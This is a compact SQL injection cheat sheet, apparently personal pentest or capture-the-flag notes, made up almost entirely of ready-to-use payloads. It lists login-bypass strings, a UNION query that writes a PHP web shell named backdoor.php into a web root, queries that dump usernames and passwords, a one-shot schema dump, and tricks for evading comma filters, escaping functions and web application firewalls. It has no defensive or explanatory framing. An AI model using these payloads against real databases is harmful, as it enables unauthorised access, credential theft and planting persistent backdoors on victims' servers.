# SQL Tips and Tricks

### Classical Test

```
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
admin\'-- -
```

### Upload File

```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### Passwords

```
uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users
uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users
```

### Dump in one shot

```
\' unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.columns)whEre@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#
```

### Virgule filtree

```
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c //%0B pour espace possible
```

### SHA1 Binary

```
# If sha1 is used as a binary string (true) you can use an hash to bypass conditions and inject SQL
# http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/
# echo -n 3fDf | openssl sha1 -binary

# GBK Charset
# Possible to bypass addslashes and magic_quotes_gpc using chinese charset
# \x27 == '
# \x5c == \
# All chinese char starts with \xbf
# \xbf\x5c is a chinese char. It means that the antislash added will be interpreted as a part or chinese char and so the quote will be interpreted
# where user.login="\xbf' or 1=1;
```

### Numerical

```
&news_id=1 union select...
```

### WAF Bypass

```
SELECT-1e1FROM`test`
SELECT~1.FROM`test`
SELECT\NFROM`test`
SELECT@^1.FROM`test`
SELECT-id-1.FROM`test`
```
